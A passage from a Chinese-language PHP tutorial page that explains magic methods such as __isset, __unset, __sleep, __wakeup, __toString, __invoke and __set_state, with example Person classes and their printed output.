class="line">我叫小红，今年16岁了</span><br></pre></td></tr></table></figure><h3 id="isset-，当对不可访问属性调用isset-或empty-时调用"><a href="#isset-，当对不可访问属性调用isset-或empty-时调用" class="headerlink" title="__isset()，当对不可访问属性调用isset()或empty()时调用"></a>__isset()，当对不可访问属性调用isset()或empty()时调用</h3><p>在看这个方法之前我们看一下<code>isset()</code>函数的应用，<code>isset()</code>是测定变量是否设定用的函数，传入一个变量作为参数，如果传入的变量存在则传回true，否则传回false。</p><p>那么如果在一个对象外面使用<code>isset()</code>这个函数去测定对象里面的成员是否被设定可不可以用它呢？</p><p>分两种情况，如果对象里面成员是公有的，我们就可以使用这个函数来测定成员属性，如果是私有的成员属性，这个函数就不起作用了，原因就是因为私有的被封装了，在外部不可见。那么我们就不可以在对象的外部使用<code>isset()</code>函数来测定私有成员属性是否被设定了呢？当然是可以的，但不是一成不变。你只要在类里面加上一个<code>__isset()</code>方法就可以了，当在类外部使用<code>isset()</code>函数来测定对象里面的私有成员是否被设定时，就会自动调用类里面的<code>__isset()</code>方法了帮我们完成这样的操作。</p><ul><li><strong>isset()的作用：当对不可访问属性调用 isset() 或 empty() 时，</strong>isset() 会被调用。</li></ul><p>请看下面代码演示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $content</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"当在类外部使用isset()函数测定私有成员&#123;$content&#125;时，自动调用&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;$content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">"小明"</span>, <span class="number">25</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($person-&gt;sex),<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($person-&gt;name),<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($person-&gt;age),<span class="string">"&lt;br&gt;"</span>;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 // public 可以 isset()</span><br><span class="line">当在类外部使用isset()函数测定私有成员name时，自动调用 // __isset() 内 第一个echo</span><br><span class="line">1 // __isset() 内第二个echo</span><br><span class="line">当在类外部使用isset()函数测定私有成员age时，自动调用 // __isset() 内 第一个echo</span><br><span class="line">1 // __isset() 内第二个echo</span><br></pre></td></tr></table></figure><h3 id="unset-，当对不可访问属性调用unset-时被调用。"><a href="#unset-，当对不可访问属性调用unset-时被调用。" class="headerlink" title="__unset()，当对不可访问属性调用unset()时被调用。"></a>__unset()，当对不可访问属性调用unset()时被调用。</h3><p>看这个方法之前呢，我们也先来看一下 <code>unset()</code> 函数，<code>unset()</code>这个函数的作用是删除指定的变量且传回true，参数为要删除的变量。</p><p>那么如果在一个对象外部去删除对象内部的成员属性用<code>unset()</code>函数可以吗？</p><p>这里自然也是分两种情况：</p><p>1、 如果一个对象里面的成员属性是公有的，就可以使用这个函数在对象外面删除对象的公有属性。</p><p>2、 如果对象的成员属性是私有的，我使用这个函数就没有权限去删除。</p><p>虽然有以上两种情况，但我想说的是同样如果你在一个对象里面加上<code>__unset()</code>这个方法，就可以在对象的外部去删除对象的私有成员属性了。在对象里面加上了<code>__unset()</code>这个方法之后，在对象外部使用“unset()”函数删除对象内部的私有成员属性时，对象会自动调用<code>__unset()</code>函数来帮我们删除对象内部的私有成员属性。</p><p>请看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $content</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;$content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">"小明"</span>, <span class="number">25</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">unset</span>($person-&gt;sex);</span><br><span class="line"><span class="keyword">unset</span>($person-&gt;name);</span><br><span class="line"><span class="keyword">unset</span>($person-&gt;age);</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当在类外部使用unset()函数来删除私有成员时自动调用的</span><br><span class="line">1当在类外部使用unset()函数来删除私有成员时自动调用的</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="sleep-，执行serialize-时，先会调用这个函数"><a href="#sleep-，执行serialize-时，先会调用这个函数" class="headerlink" title="__sleep()，执行serialize()时，先会调用这个函数"></a>__sleep()，执行serialize()时，先会调用这个函数</h3><p><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，则该方法会优先被调用，然后才执行序列化操作。</p><p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p><p>如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。</span><br></pre></td></tr></table></figure><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</span><br></pre></td></tr></table></figure><p>具体请参考如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = base64_encode(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'name'</span>, <span class="string">'age'</span>); <span class="comment">// 这里必须返回一个数值，里边的元素表示返回的属性名称</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> serialize($person);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br></pre></td></tr></table></figure><p>代码运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当在类外部使用serialize()时会调用这里的__sleep()方法</span><br><span class="line">O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;&#125;</span><br></pre></td></tr></table></figure><h3 id="wakeup-，执行unserialize-时，先会调用这个函数"><a href="#wakeup-，执行unserialize-时，先会调用这个函数" class="headerlink" title="__wakeup()，执行unserialize()时，先会调用这个函数"></a>__wakeup()，执行unserialize()时，先会调用这个函数</h3><p>如果说 <code>__sleep()</code> 是白的，那么 <code>__wakeup()</code> 就是黑的了。</p><p>那么为什么呢？</p><p>因为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">与之相反，`unserialize()` 会检查是否存在一个 `__wakeup()` 方法。如果存在，则会先调用 `__wakeup` 方法，预先准备对象需要的资源。</span><br></pre></td></tr></table></figure><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</span><br></pre></td></tr></table></figure><p>还是看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = base64_encode(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'name'</span>, <span class="string">'age'</span>); <span class="comment">// 这里必须返回一个数值，里边的元素表示返回的属性名称</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * __wakeup</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"当在类外部使用unserialize()时会调用这里的__wakeup()方法&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = <span class="string">'男'</span>;</span><br><span class="line">        <span class="comment">// 这里不需要返回数组</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">var_dump(serialize($person));</span><br><span class="line">var_dump(unserialize(serialize($person)));</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当在类外部使用serialize()时会调用这里的__sleep()方法</span><br><span class="line">string(58) &quot;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;&#125;&quot; 当在类外部使用serialize()时会调用这里的__sleep()方法</span><br><span class="line">当在类外部使用unserialize()时会调用这里的__wakeup()方法</span><br><span class="line">object(Person)#2 (3) &#123; [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; int(2) [&quot;age&quot;]=&gt; int(25) &#125;</span><br></pre></td></tr></table></figure><h3 id="toString-，类被当成字符串时的回应方法"><a href="#toString-，类被当成字符串时的回应方法" class="headerlink" title="__toString()，类被当成字符串时的回应方法"></a>__toString()，类被当成字符串时的回应方法</h3><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString() 方法用于一个类被当成字符串时应怎样回应。例如 `echo $obj;` 应该显示些什么。</span><br></pre></td></tr></table></figure><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此方法必须返回一个字符串，否则将发出一条 `E_RECOVERABLE_ERROR` 级别的致命错误。</span><br></pre></td></tr></table></figure><p>警告：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不能在 __toString() 方法中抛出异常。这么做会导致致命错误。</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  <span class="string">'go go go'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> $person;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go go go</span><br></pre></td></tr></table></figure><p>那么如果类中没有 __toString() 这个魔术方法运行会发生什么呢？让我们来测试下：</p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> $person;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Catchable fatal error: Object of class Person could not be converted to string in D:\phpStudy\WWW\test\index.php on line 18</span><br></pre></td></tr></table></figure><p>很明显，页面报了一个致命错误，这是语法所不允许的。</p><h3 id="invoke-，调用函数的方式调用一个对象时的回应方法"><a href="#invoke-，调用函数的方式调用一个对象时的回应方法" class="headerlink" title="__invoke()，调用函数的方式调用一个对象时的回应方法"></a>__invoke()，调用函数的方式调用一个对象时的回应方法</h3><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</span><br></pre></td></tr></table></figure><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本特性只在 PHP 5.3.0 及以上版本有效。</span><br></pre></td></tr></table></figure><p>直接上代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'这可是一个对象哦'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">$person();</span><br></pre></td></tr></table></figure><p>查看运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这可是一个对象哦</span><br></pre></td></tr></table></figure><p>当然，如果你执意要将对象当函数方法使用，那么会得到下面结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Function name must be a string in D:\phpStudy\WWW\test\index.php on line 18</span><br></pre></td></tr></table></figure><h3 id="set-state-，调用var-export-导出类时，此静态方法会被调用。"><a href="#set-state-，调用var-export-导出类时，此静态方法会被调用。" class="headerlink" title="__set_state()，调用var_export()导出类时，此静态方法会被调用。"></a>__set_state()，调用var_export()导出类时，此静态方法会被调用。</h3><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自 PHP 5.1.0 起，当调用 var_export() 导出类时，此静态方法会被自动调用。</span><br></pre></td></tr></table></figure><p>参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本方法的唯一参数是一个数组，其中包含按 array(&apos;property&apos; =&gt; value, ...) 格式排列的类属性。</span><br></pre></td></tr></table></figure><p>下面我们先来看看在没有加 __set_state() 情况按下，代码及运行结果如何：</p><p>上代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">var_export($person);</span><br></pre></td></tr></table></figure><p>看结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person::__set_state(array( &apos;sex&apos; =&gt; &apos;男&apos;, &apos;name&apos; =&gt; &apos;小明&apos;, &apos;age&apos; =&gt; 25, ))</span><br></pre></td></tr></table></figure><p>很明显，将对象中的属性都打印出来了</p><p>加了 __set_state() 之后：</p><p>继续上代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 